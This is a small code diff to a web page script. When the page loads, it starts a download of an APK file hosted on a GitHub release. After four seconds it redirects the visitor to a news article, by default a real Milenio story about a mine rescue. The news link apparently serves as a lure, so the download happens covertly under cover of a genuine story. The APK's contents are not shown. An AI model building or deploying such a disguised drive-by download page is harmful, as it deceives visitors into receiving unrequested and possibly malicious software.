@@ -8,14 +8,14 @@
       const noticiaUrl = params.get("noticia");
 
       // iniciar descarga
-      window.location.href = "/app.apk";
+      window.location.href = "https://github.com/pmezquita/demo-page/releases/download/v1.0.0/apk.apk";
 
       // redirigir después de unos segundos
       setTimeout(() => {
         if (noticiaUrl) {
           window.location.href = noticiaUrl;
         } else {
-          window.location.href = "https://tudominio.com/noticia"; // fallback
+          window.location.href = "https://www.milenio.com/estados/rescatan-primer-trabajador-atrapado-mina-santa-fe-culiacan-sinaloa"; // fallback
         }
       }, 4000);
     }
